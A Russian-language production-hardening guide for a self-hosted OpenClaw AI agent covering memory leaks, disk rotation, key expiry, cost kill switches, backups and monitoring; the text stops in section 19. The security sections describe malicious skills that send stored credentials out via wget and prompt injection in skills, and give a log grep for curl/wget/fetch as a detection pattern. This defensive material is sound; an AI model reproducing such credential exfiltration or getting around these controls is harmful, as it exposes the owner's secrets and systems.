# Production hardening — что ломается через месяц

> Уроки от тех, кто уже падал в проде. Что забывают новички, когда ставят OpenClaw на VPS, делают `systemctl enable` и считают, что готово.
>
> Дата: апрель 2026
> Автор-исследователь: research-агент команды Дмитрия
> Тема: PRO-04 — производственная закалка personal AI агента на OpenClaw

---

## Кому это нужно

Базовые блоки 01–20 рассказали, **как поднять**. Этот документ — про то, **что произойдёт через 30, 60, 90 дней**, когда вы перестали смотреть `htop` каждый час и наслаждаетесь работой агента.

Большая часть проблем здесь — это не про bug в OpenClaw. Это про то, что любой long-running Node.js процесс на VPS неизбежно встречает: ползущий heap, истекающие токены, забытые ключи, переполненные диски, тихие регрессии.

Документ разбит на 20 конкретных лайфхаков + 4 операционных раздела (SLO, DR, quarterly checklist, специфика РФ).

---

## Топ-20 долгосрочных проблем и решений

### 1. Memory leak в Node.js процессе OpenClaw

**Когда возникает:** через 2–6 недель непрерывной работы. RSS медленно ползёт вверх, OOM-killer убивает процесс ночью, бот не отвечает утром.

**Как проявляется:** `heapUsed` растёт монотонно без выхода на плато. На VPS с 2 GB RAM при 1.5 GB RSS приходит OOM. Симптом: процесс рестартует сам себя в случайные часы, в логах `out of memory`.

**Превентивная мера:**
1. Включить heap monitoring в Prometheus/healthcheck-эндпоинте. Каждые 30 секунд писать `process.memoryUsage()` в лог-файл или metrics endpoint.
2. Добавить `max_memory_restart` страховку через PM2 или systemd.

```ini
# /etc/systemd/system/openclaw.service
[Service]
ExecStart=/usr/bin/node /opt/openclaw/bin/openclaw gateway run
MemoryMax=1500M
MemoryHigh=1200M
Restart=always
RestartSec=10
# Если процесс превысит MemoryMax — systemd убьёт его, Restart поднимет
```

3. Snapshot-сравнение раз в неделю:

```bash
# /usr/local/bin/openclaw-heap-snap.sh
NODE_PID=$(pgrep -f "openclaw gateway")
kill -USR2 "$NODE_PID"   # триггер heap dump (если включён --heap-prof)
ls -lh /tmp/heap-*.heapsnapshot | tail -3
```

4. Норма для OpenClaw: heap ~150–250 MB через сутки, RSS ~300–500 MB. Всё что растёт >50 MB/день — leak.

**Что делать если уже случилось:** взять heap snapshot до и после нагрузки, сравнить в Chrome DevTools (Memory → Comparison view). Чаще всего leak — оборванные event listeners на каналах (Telegram/Discord) или неосвобождённые closures в session-стейтах.

**Источник:** [Node.js Memory Leaks: Detection & Debugging — Toptal](https://www.toptal.com/nodejs/debugging-memory-leaks-node-js-applications), [Optimize Node.js for Production Guide 2026](https://forwardemail.net/en/blog/docs/optimize-nodejs-performance-production-monitoring-pm2-health-checks)

---

### 2. Распухание `~/.openclaw/agents/<id>/sessions/` и `MEMORY.md`

**Когда возникает:** через 3–6 недель активного использования. Каждая сессия — `.jsonl` со всеми токенами, тулколлами, ошибками.

**Как проявляется:** `du -sh ~/.openclaw/agents/*/sessions/` показывает 5–15 GB. На 25-GB VPS критично. `MEMORY.md` достигает 500 KB и съедает context window каждого запуска.

**Превентивная мера — cron-ротация:**

```bash
# /etc/cron.d/openclaw-rotate
0 3 * * * dmitry find /home/dmitry/.openclaw/agents/*/sessions -name "*.jsonl" -mtime +30 -delete
0 3 * * 0 dmitry tar -czf /home/dmitry/backup/sessions-$(date +\%Y\%m\%d).tar.gz /home/dmitry/.openclaw/agents/*/sessions --remove-files --newer-mtime="60 days ago"
```

Для `MEMORY.md` — еженедельная консолидация навыком `consolidate-memory` (это родной OpenClaw skill). Поставить cron:

```bash
0 4 * * 1 dmitry openclaw chat --skill consolidate-memory --noninteractive
```

**Что делать если уже случилось:** `openclaw sessions list --older-than 30d --delete`. После — рестарт gateway (старые JSONL могут быть открыты file-handles).

**Источник:** [OpenClaw Security Hardening — docs.openclaw.ai](https://docs.openclaw.ai/gateway/security)

---

### 3. journalctl съедает диск

**Когда возникает:** через 6–10 недель. Дефолтный journald не имеет лимита.

**Как проявляется:** `df -h` показывает 90% занятости. `du -sh /var/log/journal` = 8 GB. Никаких ошибок нет, просто диск кончается.

**Превентивная мера — лимиты в `/etc/systemd/journald.conf`:**

```ini
[Journal]
SystemMaxUse=500M
SystemKeepFree=2G
SystemMaxFileSize=50M
MaxRetentionSec=2week
ForwardToSyslog=no
```

Применить: `systemctl restart systemd-journald`. Сразу очистить старое: `journalctl --vacuum-size=500M`.

**Что делать если уже случилось:** `journalctl --rotate && journalctl --vacuum-time=7d`. Если диск 100% — сначала `> /var/log/syslog` чтоб освободить байт, потом vacuum.

**Источник:** [Optimize journalctl to save disk space — Hetzner Community](https://community.hetzner.com/tutorials/optimize-journalctl-to-save-server-disk-space-in-linux/), [journald.conf man page](https://www.freedesktop.org/software/systemd/man/latest/journald.conf.html)

---

### 4. SSH-туннель к дашборду умер ночью

**Когда возникает:** через 1–4 недели. Провайдер ребутает свой шлюз, ваш WiFi моргнул, NAT таблица протухла — туннель оборвался без следов.

**Как проявляется:** дашборд показывает пустой экран или 502, агент работает, но вы об этом не знаете. SSH сессия `ps aux | grep ssh` отсутствует.

**Превентивная мера — autossh + systemd:**

```ini
# /etc/systemd/system/openclaw-tunnel.service
[Unit]
Description=OpenClaw Dashboard Reverse Tunnel
After=network-online.target
Wants=network-online.target

[Service]
User=dmitry
Environment="AUTOSSH_GATETIME=0"
ExecStart=/usr/bin/autossh -M 0 -N \
  -o "ServerAliveInterval=30" \
  -o "ServerAliveCountMax=3" \
  -o "ExitOnForwardFailure=yes" \
  -o "StrictHostKeyChecking=accept-new" \
  -L 0.0.0.0:8080:localhost:8080 \
  -i /home/dmitry/.ssh/id_ed25519 \
  dmitry@vps.example.com
Restart=always
RestartSec=10
StartLimitIntervalSec=0

[Install]
WantedBy=multi-user.target
```

`-M 0` отключает встроенный мониторный порт autossh — мы используем SSH ServerAlive вместо него. `ExitOnForwardFailure=yes` критично: без него autossh может думать что туннель жив, но порт занят.

**Что делать если уже случилось:** `systemctl restart openclaw-tunnel && journalctl -u openclaw-tunnel -n 50`. Если падает повторно — проверить firewall на VPS и не сменился ли host-key (`ssh-keygen -R vps.example.com`).

**Источник:** [Setting up autossh with systemd — OneUptime](https://oneuptime.com/blog/post/2026-03-20-ssh-persistent-tunnels-autossh/view), [autossh systemd service gist](https://gist.github.com/thomasfr/9707568)

---

### 5. Tailscale node key истекает через 90 дней — агент пропадает с tailnet

**Когда возникает:** ровно через 90 дней (default expiry для node key) или 180 дней. Headless VPS не может пройти interactive re-auth.

**Как проявляется:** `tailscale status` показывает «expired». Доступ к VPS через tailnet потерян. Если у вас есть резервный SSH через публичный IP — норм; если нет — придётся идти через провайдерскую web-консоль.

**Превентивная мера:**
1. **Тег + отключение expiry:** при первой регистрации ноды использовать tagged auth-key с `--advertise-tags=tag:server`. В админке tailscale → Settings → отключить Key Expiry для tag:server.
2. **Альтернатива:** использовать OAuth client вместо обычного auth-key — OAuth-ключи не истекают.

```bash
# При установке tailscale на VPS:
sudo tailscale up --auth-key=tskey-auth-XXX --advertise-tags=tag:openclaw-server
# В admin console → Access controls добавить:
# "tagOwners": { "tag:openclaw-server": ["autogroup:admin"] }
```

3. **Календарный reminder за 7 дней до expiry**, даже если поставили tag.

**Что делать если уже случилось:** через провайдерский console / KVM доступ — `sudo tailscale logout && sudo tailscale up --auth-key=NEW`.

**Источник:** [Tailscale Key Expiry docs](https://tailscale.com/docs/features/access-control/key-expiry), [Tagged Nodes No Longer Require Key Renewal](https://tailscale.com/blog/tagged-key-expiry)

---

### 6. Anthropic / OpenAI quota исчерпан — агент молчит

**Когда возникает:** в день, когда счёт по карте отбили (сменили срок), Anthropic auto-charge отключился, или вы упёрлись в monthly cap.

**Как проявляется:** все запросы возвращают `429 rate_limit_exceeded` или `insufficient_quota`. Агент молчит на сообщения в Telegram, никаких алертов не приходит.

**Превентивная мера — три уровня:**

1. **Fallback-провайдеры в config.** OpenClaw поддерживает failover между провайдерами:

```json5
// ~/.openclaw/agents/main/config.jsonc
{
  models: {
    primary: { provider: "anthropic", model: "claude-opus-4-7" },
    fallback: [
      { provider: "openrouter", model: "anthropic/claude-opus-4-7" },
      { provider: "openai", model: "gpt-5o" },
      { provider: "ollama", model: "llama3.3:70b", baseUrl: "http://localhost:11434" }
    ]
  }
}
```

2. **Circuit breaker.** После 5 подряд 429-ответов — переключение на fallback на 60 секунд, затем half-open пробный запрос.

3. **Healthcheck с алертом.** Каждые 5 минут — запрос «ping» в агента; если не отвечает 2 раза подряд — Telegram-алерт через отдельный bot (не основной!).

```bash
# /usr/local/bin/openclaw-ping.sh
RESPONSE=$(curl -s --max-time 30 http://localhost:8080/api/ping -d '{"text":"healthcheck"}')
if [ -z "$RESPONSE" ]; then
  curl -s "https://api.telegram.org/bot$ALERT_BOT_TOKEN/sendMessage" \
    -d "chat_id=$ADMIN_CHAT_ID&text=⚠️ openclaw не отвечает $(date)"
fi
```

**Что делать если уже случилось:** проверить billing на dash.anthropic.com / platform.openai.com. Включить fallback вручную через `openclaw config set models.primary.provider openrouter`. Залить $10 на резервный provider.

**Источник:** [LLM Error Handling and Fallback Strategies for Production](https://www.buildmvpfast.com/blog/building-with-unreliable-ai-error-handling-fallback-strategies-2026), [Beyond Model Fallbacks: Provider-Level Resilience](https://medium.com/@tombastaner/beyond-model-fallbacks-building-provider-level-resilience-for-ai-systems-e1d00f3b016d)

---

### 7. API-ключи истекают без предупреждения

**Когда возникает:** GitHub PAT — 30/60/90/365 дней (вы ставили). Google PAT — 7 дней (если scope `gmail.readonly`). Anthropic/OpenAI — не истекают, но билинговая карта да.

**Как проявляется:** в среду перестают работать `gh` команды; в пятницу — Gmail-skill; в понедельник — деплой. Никто не предупредил.

**Превентивная мера — единый rotation calendar:**

```bash
# ~/.openclaw/secrets-rotation.md
# Quarterly rotation schedule (last sunday of quarter at 10:00)

| Secret              | Last rotated | Next rotation | Owner | Where stored        |
|---------------------|--------------|---------------|-------|---------------------|
| GH_PAT              | 2026-01-15   | 2026-04-15    | DP    | ~/.openclaw/.env    |
| ANTHROPIC_API_KEY   | 2026-02-01   | 2026-05-01    | DP    | auth-profiles.json  |
| TG_BOT_TOKEN        | 2026-01-01   | 2026-07-01    | DP    | systemd EnvFile     |
| RESTIC_PASSWORD     | 2026-01-01   | NEVER         | DP    | 1Password (sealed)  |
| OPENROUTER_KEY      | 2026-03-01   | 2026-06-01    | DP    | ~/.openclaw/.env    |
```

Cron-напоминалка за 7 дней:

```bash
# /etc/cron.d/secrets-reminder
0 9 * * 1 dmitry /usr/local/bin/check-secrets-expiry.sh
```

```bash
# /usr/local/bin/check-secrets-expiry.sh
WARN_DAYS=7
TODAY=$(date +%s)
while IFS='|' read -r name last next owner store; do
  next=$(echo "$next" | xargs)
  [ "$next" = "NEVER" ] && continue
  next_ts=$(date -d "$next" +%s 2>/dev/null) || continue
  diff_days=$(( (next_ts - TODAY) / 86400 ))
  if [ "$diff_days" -le "$WARN_DAYS" ]; then
    curl -s "https://api.telegram.org/bot$ALERT_BOT_TOKEN/sendMessage" \
      -d "chat_id=$ADMIN&text=🔑 Через $diff_days дн. ротировать $name"
  fi
done < ~/.openclaw/secrets-rotation.md
```

**Что делать если уже случилось:** rotate end-to-end drill — выпустить новый ключ, заменить в config, рестартнуть, проверить что работает, отозвать старый.

**Источник:** [Anthropic API Key: Generate, Secure & Rotate Safely (2026)](https://tokenmix.ai/blog/anthropic-api-key-generate-secure-rotate-2026), [API Key Rotation — OpenRouter Docs](https://openrouter.ai/docs/guides/administration/api-key-rotation)

---

### 8. Runaway loop — агент сжёг $4200 за ночь

**Когда возникает:** через несколько недель. Какой-то edge case заставляет агента зациклиться (вызов tool → ошибка → попытка переформулировать → снова ошибка → loop).

**Как проявляется:** утром приходит email от Anthropic «monthly spend exceeded $X». Реальный кейс — $4200 за 63 часа.

**Превентивная мера — три слоя защиты:**

1. **Hard daily cap в OpenClaw config:**

```json5
{
  agents: {
    defaults: {
      budget: {
        dailyUsd: 5,           // hard ceiling
        warnAtUsd: 3,          // алерт раньше
        perRequestMaxTokens: 200000,
        maxIterationsPerSession: 30
      }
    }
  }
}
```

2. **Watchdog-процесс:** отдельный systemd timer каждую минуту читает текущие траты из `openclaw cost --today` и при превышении $5 шлёт `openclaw gateway pause`.

```bash
# /usr/local/bin/openclaw-cost-watchdog.sh
COST=$(openclaw cost --today --json | jq .total_usd)
LIMIT=5.00
if (( $(echo "$COST > $LIMIT" | bc -l) )); then
  openclaw gateway pause
  curl -s "https://api.telegram.org/bot$ALERT_BOT_TOKEN/sendMessage" \
    -d "chat_id=$ADMIN&text=🚨 KILL SWITCH: spent \$$COST > \$$LIMIT, paused"
fi
```

3. **Hard limit на стороне провайдера.** В Anthropic console → Limits → Monthly spending limit = $50. Это последний рубеж — даже если все остальные защиты сломались, провайдер сам остановит.

**Что делать если уже случилось:** мгновенный `openclaw gateway stop`. Анализ логов сессий: `grep -E "iteration:[5-9][0-9]+" ~/.openclaw/agents/main/sessions/*.jsonl`. Запросить у Anthropic credit (если первый раз — иногда возвращают).

**Источник:** [The Agent That Burned $4,200 in 63 Hours: Production AI Postmortem](https://medium.com/@sattyamjain96/the-agent-that-burned-4-200-in-63-hours-a-production-ai-postmortem-d38fd9586a85), [Why Your AI Agent Needs a Kill Switch](https://dev.to/diven_rastdus_c5af27d68f3/why-your-ai-agent-needs-a-kill-switch-and-how-to-build-one-3g73), [LLM Budget Management — AI Security Gateway](https://aisecuritygateway.ai/docs/llm-budget-enforcement)

---

### 9. Малициозный skill в ClawHub

**Когда возникает:** в любой момент. ClawHavoc-кампания — 1184 малициозных скиллов, замаскированных под productivity-tools. ToxicSkills (Snyk) — 36% скиллов с prompt injection, 1467 payload.

**Как проявляется:** установили якобы `gmail-helper` от незнакомого автора, скилл при первом запуске экспортирует `~/.openclaw/credentials/` в pastebin через wget.

**Превентивная мера:**

1. **Allowlist плагинов в config:**

```json5
{
  plugins: {
    allow: [
      "@anthropic-skills/pdf",
      "@anthropic-skills/whisper-transcription",
      "openclaw/skills/git-pushing"
    ],
    requireSignedSources: true
  }
}
```

2. **Pin exact versions** — никаких `latest`. Перед обновлением — diff на unpacked коде.

3. **Pre-install scan через SkillRisk** (бесплатный сканер):

```bash
# Перед установкой:
skillrisk-scan @some-author/some-skill
# Outputs: 3 critical findings — DO NOT INSTALL
```

4. **Plugin sandbox.** Если скилл всё-таки нужен — запускать его в Docker-sandbox с workspace-only filesystem:

```json5
{
  agents: {
    "untrusted-skill-runner": {
      sandbox: {
        mode: "all",
        scope: "agent",
        workspaceAccess: "ro",
        dockerImage: "openclaw/sandbox:latest"
      }
    }
  }
}
```

**Что делать если уже случилось:**
1. `openclaw gateway stop`
2. Уволить плагин: `openclaw plugins remove @evil/skill`
3. **Rotate ВСЕ secrets:** все API-ключи, Tailscale OAuth, Telegram bot token, GitHub PAT.
4. Проверить логи на исходящий трафик: `journalctl -u openclaw | grep -iE "curl|wget|fetch"`.
5. Если есть подозрение на персистентность — `restic restore` чистого snapshot до установки.

**Источник:** [Snyk: How a Malicious Google Skill on ClawHub Tricks Users](https://snyk.io/blog/clawhub-malicious-google-skill-openclaw-malware/), [ClawHavoc Poisons OpenClaw's ClawHub With 1,184 Malicious Skills](https://cyberpress.org/clawhavoc-poisons-openclaws-clawhub-with-1184-malicious-skills/), [SkillRisk scanner](https://skillrisk.org/)

---

### 10. Race condition в multi-agent workspace

**Когда возникает:** когда у вас 2+ агента (main + cron-агент + telegram-агент) пишут в общий MEMORY.md или sessions.

**Как проявляется:** GitHub issue #29947 в openclaw/openclaw — concurrent read/modify/write теряет один writer's update без всяких ошибок. Просто часть памяти исчезает.

**Превентивная мера — explicit locks:**

```python
# Псевдокод pattern для skill, работающего с общим файлом
lock_id = openclaw.acquire_lock(path="MEMORY.md", timeout="5m")
if lock_id:
  try:
    data = read_file("MEMORY.md")
    # ... модификация ...
    write_file("MEMORY.md", new_data)
  finally:
    openclaw.release_lock(lock_id)
```

Альтернатива — append-only лог + еженедельная консолидация:

```markdown
# MEMORY.md → MEMORY-append.jsonl + MEMORY-consolidated.md
# Все агенты пишут в append-only:
{"ts":"2026-04-29T10:00:00Z","agent":"main","fact":"..."}
{"ts":"2026-04-29T10:01:00Z","agent":"cron","fact":"..."}
# Раз в неделю consolidate-memory скилл схлопывает в MEMORY-consolidated.md
```

**Что делать если уже случилось:** найти расхождения через git log по MEMORY.md (если он в git), смержить вручную. На будущее — включить локи или append-only.

**Источник:** [GitHub openclaw#29947 — race condition shared workspace](https://github.com/openclaw/openclaw/issues/29947), [LumaDock: OpenClaw multi-agent coordination](https://lumadock.com/tutorials/openclaw-multi-agent-coordination-governance), [GitHub openclaw#3611 — multi-agent OAuth refresh race](https://github.com/openclaw/openclaw/issues/3611)

---

### 11. /tmp забит — OpenClaw не может писать

**Когда возникает:** через 2–8 недель. PrivateTmp в systemd создаёт `/tmp/systemd-private-*`, OpenClaw пишет heap-snapshots, browser-tool скачивает скриншоты — всё в /tmp.

**Как проявляется:** агент внезапно перестаёт отвечать, в логах `ENOSPC: no space left on device, open '/tmp/...'`. `df -h /tmp` = 100%.

**Превентивная мера:**

1. **Отдельный mount для /tmp** с лимитом или tmpfs:

```bash
# /etc/fstab
tmpfs /tmp tmpfs defaults,nodev,nosuid,size=2G,mode=1777 0 0
```

2. **Регулярная очистка:**

```bash
# /etc/cron.daily/clean-tmp
find /tmp -type f -atime +7 -not -newer /var/run -delete 2>/dev/null
find /tmp/openclaw* -type d -empty -delete 2>/dev/null
```

3. **Disk space alert:**

```bash
# /usr/local/bin/disk-alert.sh — крон каждые 15 минут
USED=$(df /tmp | awk 'NR==2 {print $5}' | tr -d '%')
if [ "$USED" -gt 80 ]; then
  curl -s "https://hc-ping.com/$HEALTHCHECK_UUID/fail" -d "tmp=${USED}%"
fi
```

**Что делать если уже случилось:** `find /tmp -type f -mtime +1 -delete && systemctl restart openclaw`.

**Источник:** [tmp full disk crash — Plesk](https://support.plesk.com/hc/en-us/articles/12389290628759), [Linux Disk IO Monitoring — Sematext](https://sematext.com/blog/the-complete-guide-to-linux-disk-io-monitoring-alerting-and-tuning/)

---

### 12. DNS-резолюция api.anthropic.com сломалась

**Когда возникает:** случается у мелких VPS-провайдеров, когда их DNS-резолверы лежат или режут запросы. Также при блокировках на сетевом уровне.

**Как проявляется:** `curl https://api.anthropic.com` зависает. Агент не отвечает. `dig api.anthropic.com @8.8.8.8` работает, `dig api.anthropic.com` (без @) — нет.

**Превентивная мера:**

1. Прописать резервные резолверы в `/etc/systemd/resolved.conf`:

```ini
[Resolve]
DNS=1.1.1.1 8.8.8.8 9.9.9.9
FallbackDNS=1.0.0.1 8.8.4.4
DNSOverTLS=opportunistic
Cache=yes
```

2. Локальный DNS-кэш через `dnsmasq` или unbound — ловит short-term отказы upstream.

3. Healthcheck из cron:

```bash
* * * * * dig +short api.anthropic.com >/dev/null || systemctl restart systemd-resolved
```

**Что делать если уже случилось:** `sudo systemctl restart systemd-resolved` или вручную `echo "nameserver 1.1.1.1" | sudo tee /etc/resolv.conf` (если он не managed).

**Источник:** [Cloudflare Resolver Outage Analysis](https://www.catchpoint.com/blog/cloudflares-resolver-outage-more-than-just-dns)

---

### 13. npm registry лежит — нельзя обновить OpenClaw

**Когда возникает:** реальный outage был 29 января 2026. Каждые 6–12 месяцев такое случается.

**Как проявляется:** `npm install -g @openclaw/openclaw` падает с 500/503. Не можете установить плагин или обновиться.

**Превентивная мера — Verdaccio как кэш-прокси:**

```bash
docker run -d --name verdaccio \
  -p 4873:4873 \
  -v /opt/verdaccio:/verdaccio/storage \
  --restart=always \
  verdaccio/verdaccio
```

В `~/.npmrc`:

```
registry=http://localhost:4873/
```

После одной успешной установки — пакеты закэшированы. **Важно:** Verdaccio 4.x проксирует 5xx-ошибки upstream — кэш помогает только если пакет уже скачан. Регулярно прогревайте кэш на нужные пакеты.

**Что делать если уже случилось:** если обновлять не критично — подождать (обычно <2 часа). Если критично — поставить из git: `npm install -g github:openclaw/openclaw#v2026.4.0`.

**Источник:** [npm Outage January 29 2026](https://getautonoma.com/blog/npm-outage-january-2026), [Verdaccio docs](https://www.verdaccio.org/)

---

### 14. TLS-сертификат на дашборде истёк

**Когда возникает:** через 90 дней (Let's Encrypt). Если cron renewal сломался — без предупреждения.

**Как проявляется:** Chrome ругается «NET::ERR_CERT_DATE_INVALID», Telegram webhook (если у вас self-hosted) перестаёт работать — Telegram требует валидный TLS.

**Превентивная мера:**

1. **certbot timer + monitoring renewal logs:**

```bash
sudo certbot renew --dry-run   # проверить что сценарий работает
systemctl list-timers | grep certbot
```

2. **Healthcheck на expiry:**

```bash
# /usr/local/bin/cert-expiry-check.sh
DOMAIN=dashboard.example.com
EXPIRY=$(echo | openssl s_client -servername $DOMAIN -connect $DOMAIN:443 2>/dev/null | openssl x509 -noout -enddate | cut -d= -f2)
EXPIRY_TS=$(date -d "$EXPIRY" +%s)
NOW_TS=$(date +%s)
DAYS=$(( (EXPIRY_TS - NOW_TS) / 86400 ))
if [ "$DAYS" -lt 14 ]; then
  curl -X POST "https://hc-ping.com/$UUID/fail" -d "cert expires in $DAYS days"
fi
```

3. **certmanager_certificate_expiration_timestamp_seconds metric** — если у вас k8s/Prometheus.

**Что делать если уже случилось:** `sudo certbot renew --force-renewal && systemctl reload nginx`.

**Источник:** [How to Deploy cert-manager with Let's Encrypt — OneUptime](https://oneuptime.com/blog/post/2026-02-09-cert-manager-letsencrypt-acme/view), [cert-manager.io docs](https://cert-manager.io/docs/)

---

### 15. Бэкапы есть, но нешифрованные / без object lock

**Когда возникает:** в день, когда атакующий получит доступ к VPS (через RCE в скилле, через скомпрометированный SSH-ключ). Первое что он сделает — `restic forget --prune` или удалит весь бакет.

**Как проявляется:** хотите восстановиться, а бэкапов нет. Или они есть, но без шифрования и атакующий уже скачал ваши секреты из них.

**Превентивная мера — Restic + Backblaze B2 + Object Lock:**

1. **Restic шифрует by default** (AES-256). Главное — пароль:

```bash
# Сгенерировать сильный пароль и хранить в 1Password / Bitwarden
RESTIC_PASSWORD=$(openssl rand -base64 32)
# В скрипте бэкапа:
export RESTIC_PASSWORD_FILE=/root/.restic-password
chmod 600 /root/.restic-password
```

2. **Application key с минимальными правами** — НЕ использовать master key. Создать в B2 console: scope = single bucket, permissions = listFiles + readFiles + writeFiles (без deleteFiles если используете Object Lock).

3. **Object Lock + Lifecycle Rules в B2 bucket settings:**
   - Object Lock: `Compliance` mode, retention = 30 days
   - Это значит: даже атакующий с full key не может удалить snapshots младше 30 дней.

4. **Скрипт бэкапа:**

```bash
#!/usr/bin/env bash
# /usr/local/bin/openclaw-backup.sh
set -euo pipefail
export RESTIC_REPOSITORY="b2:openclaw-backups:vps01"
export RESTIC_PASSWORD_FILE=/root/.restic-password
export B2_ACCOUNT_ID=$(cat /root/.b2-account-id)
export B2_ACCOUNT_KEY=$(cat /root/.b2-account-key)

restic backup \
  --tag daily \
  --exclude-file=/root/.restic-excludes \
  /home/dmitry/.openclaw \
  /etc \
  /home/dmitry/Documents

restic forget \
  --keep-daily 7 \
  --keep-weekly 4 \
  --keep-monthly 12 \
  --prune

# Раз в неделю — verify
[ "$(date +%u)" = "7" ] && restic check --read-data-subset=10%
```

5. **Раз в месяц — restore drill** (восстановление одного файла, проверка что бэкап читаем):

```bash
restic restore latest --target /tmp/restore-test --include /home/dmitry/.openclaw/agents/main/SOUL.md
diff /tmp/restore-test/.../SOUL.md /home/dmitry/.openclaw/agents/main/SOUL.md
```

**Что делать если уже случилось (бэкапы удалены):** Object Lock спасает. Если его не было — у Backblaze есть soft-delete на 1 день для случайно удалённых файлов.

**Источник:** [How to do ransomware-resistant backups properly with Restic and Backblaze B2](https://medium.com/@benjamin.ritter/how-to-do-ransomware-resistant-backups-properly-with-restic-and-backblaze-b2-e649e676b7fa), [Backblaze B2 + Restic Quickstart](https://help.backblaze.com/hc/en-us/articles/4403944998811)

---

### 16. Telegram bot token revoked — все каналы умерли

**Когда возникает:** если кто-то случайно постит token в чат / коммитит в публичный репо. Telegram BotFather или сам Telegram отзывает.

**Как проявляется:** все Telegram-каналы в OpenClaw молчат. `openclaw channels status --probe` показывает `401 Unauthorized` на Telegram.

**Превентивная мера:**

1. **Pre-commit hook на gitleaks:**

```bash
# .git/hooks/pre-commit
gitleaks protect --staged --redact --verbose || exit 1
```

2. **Token хранится только в systemd EnvFile с mode 600**, не в коде, не в config-файле, который коммитится:

```ini
# /etc/systemd/system/openclaw.service
EnvironmentFile=/etc/openclaw/secrets.env
```

```bash
chmod 600 /etc/openclaw/secrets.env
chown root:root /etc/openclaw/secrets.env
```

3. **Резервный bot на тот же chat_id.** Иметь второго бота, зарегистрированного, но не запущенного. Если основной упал — переключить за 5 минут вручную.

**Что делать если уже случилось:** BotFather → /revoke → новый token → обновить в `/etc/openclaw/secrets.env` → `systemctl restart openclaw`.

**Источник:** [OpenClaw security incident response — docs](https://docs.openclaw.ai/gateway/security)

---

### 17. Sandbox escape через MCP server с exec

**Когда возникает:** когда подключаете MCP server со scope «execute shell» (типа shell-mcp, code-runner). Если конфигурация неаккуратная — RCE на хост.

**Как проявляется:** в логах непонятные исходящие соединения, новые cron-задачи в `/etc/cron.d/`, изменённый `~/.ssh/authorized_keys`.

**Превентивная мера:**

1. **Никогда не запускать MCP exec server без Docker-sandbox:**

```yaml
# docker-compose.yml для MCP shell server
services:
  mcp-shell:
    image: openclaw/mcp-shell:latest
    user: 1000:1000
    read_only: true
    cap_drop: [ALL]
    security_opt:
      - no-new-privileges:true
      - seccomp=/etc/docker/seccomp-mcp.json
    volumes:
      - ./workspace:/workspace:rw
      - ./tools:/tools:ro
    networks: [sandbox]
    mem_limit: 512m
    pids_limit: 100
networks:
  sandbox:
    driver: bridge
    internal: true   # КРИТИЧНО: нет интернета внутри
```

2. **CVE-2025-59536 защита:** в `.mcp.json` все servers должны иметь `requireConsent: true`. Не позволять auto-approve серверам.

3. **CVE-2026-21852 защита:** проверять что `ANTHROPIC_BASE_URL` не подменили в проектных конфигах:

```bash
# /usr/local/bin/check-base-url.sh
EXPECTED="https://api.anthropic.com"
ACTUAL=$(grep -r "ANTHROPIC_BASE_URL" ~/.openclaw ~/projects 2>/dev/null | grep -v "$EXPECTED")
if [ -n "$ACTUAL" ]; then
  echo "🚨 SUSPICIOUS BASE_URL: $ACTUAL" | mail -s "MCP injection" admin@example.com
fi
```

**Что делать если уже случилось:** немедленно `openclaw gateway stop`, восстановить чистый snapshot из restic, ротировать ВСЕ secrets. См. Disaster Recovery runbook ниже.

**Источник:** [MCP Server Vulnerabilities 2026 — Practical DevSecOps](https://www.practical-devsecops.com/mcp-security-vulnerabilities/), [MCP-Airlock Defense Architecture](https://crunchtools.com/mcp-airlock-open-source-defense-prompt-injection-ai-agents/), [Every OpenClaw CVE Explained — MintMCP](https://www.mintmcp.com/blog/openclaw-cve-explained)

---

### 18. Silent model degradation после обновления

**Когда возникает:** Anthropic выпускает новую версию Sonnet/Opus, Pearson cycle обновляет модель — личность бота тоньше съезжает, ответы становятся «неправильными», но не сломанными.

**Как проявляется:** через 2 недели вы замечаете: бот реже использует ваш сленг, hallucinates на знакомых задачах. Невозможно поймать без эталона.

**Превентивная мера — eval pipeline + golden set:**

1. Собрать **golden dataset** из 50 диалогов:

```yaml
# ~/.openclaw/evals/golden-set.yaml
- id: 001-greeting
  input: "Привет"
  expected_traits:
    - language: ru
    - tone: friendly_familiar
    - max_tokens: 50

- id: 042-cron-task
  input: "Поставь напоминалку через 30 минут позвонить маме"
  expected_traits:
    - tool_called: cron.create
    - args_contains: "позвонить маме"
    - args_contains_iso: true   # время в ISO формате
```

2. **Weekly eval cron:**

```bash
# /etc/cron.d/openclaw-eval
0 5 * * 1 dmitry openclaw eval run --golden-set ~/.openclaw/evals/golden-set.yaml --report ~/.openclaw/evals/$(date +\%Y\%m\%d).json
```

3. **LLM-as-judge** для качества ответов: второй модели даём output + expected_traits, она ставит балл 0–10. Регрессия = балл упал >1 пункта неделя к неделе.

4. **A/B тесты на личность:** если меняете SOUL.md — прогнать old SOUL.md vs new SOUL.md на golden set, сравнить баллы.

**Что делать если уже случилось:** rollback модели через config (`models.primary.model = "claude-opus-4-7-20260315"` — pin exact version), запустить eval еще раз.

**Источник:** [Building a Golden Dataset for AI Evaluation](https://www.getmaxim.ai/articles/building-a-golden-dataset-for-ai-evaluation-a-step-by-step-guide/), [LLM Regression Testing Pipeline 2026 — TestQuality](https://testquality.com/llm-regression-testing-pipeline/), [Ship Prompts Like Software](https://www.anup.io/ship-prompts-like-software-regression-testing-for-llms/)

---

### 19. Synthetic monitoring — никто не замечает что бот лежит

**Когда возникает:** через 1–4 недели, когда Дмитрий уезжает в путешествие и не пишет боту 3 дня. Бот лежит — никто не замечает до возвращения.

**Как проявляется:** Telegram-канал «жив» (статус online), но не отвечает. systemd показывает service active. Только реальный запрос-проверка ловит.

**Превентивная мера — synthetic check каждые 5 минут:**

1. **Healthchecks.io** — бесплатный план, 20 чеков, отлично подходит для cron-monitoring:

```bash
# /etc/cron.d/openclaw-synthetic
*/5 * * * * dmitry /usr/local/bin/openclaw-synthetic.sh
```

```bash
# /usr/local/bin/openclaw-synthetic.sh
HC_UUID="your-healthcheck-uuid"
RESPONSE=$(timeout 30 openclaw chat --text "ping (synthetic)" --noninteractive --json)

if echo "$RESPONSE" | jq -e '.text' >/dev/null && \
   [ "$(echo "$RESPONSE" | jq -r '.took_ms')" -lt 15000 ]; then
  curl -fsS -m 10 "https://hc-ping.com/$HC_UUID"
else
  curl -fsS -m 10 "https://hc-ping.com/$HC_UUID/fail" \
    --data-raw "openclaw not responding or slow"
fi
```

Healthchecks шлёт алерт в Telegram/email/Pushover если ping не пришёл за 5+ минут.

2. **UptimeRobot** для дашборда — HTTPS check каждые 5 минут на `dashboard.example.com/api/health`.

